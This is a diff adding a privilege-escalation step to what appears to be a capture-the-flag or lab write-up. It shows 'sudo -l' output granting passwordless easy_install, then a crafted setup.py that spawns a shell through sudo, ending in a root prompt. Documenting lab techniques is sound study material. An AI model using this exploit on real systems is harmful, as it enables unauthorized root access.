@@ -150,4 +150,18 @@ developer
 ### Prriv root
 ```
 $ sudo -l
+Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install
+$ TF=$(mktemp -d)
+$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+$ sudo /usr/local/bin/easy_install $TF
+WARNING: The easy_install command is deprecated and will be removed in a future version.
+Processing tmp.4SkJVrB8tO
+Writing /tmp/tmp.4SkJVrB8tO/setup.cfg
+Running setup.py -q bdist_egg --dist-dir /tmp/tmp.4SkJVrB8tO/egg-dist-tmp-SMRkdB
+# whoami
+root
+```
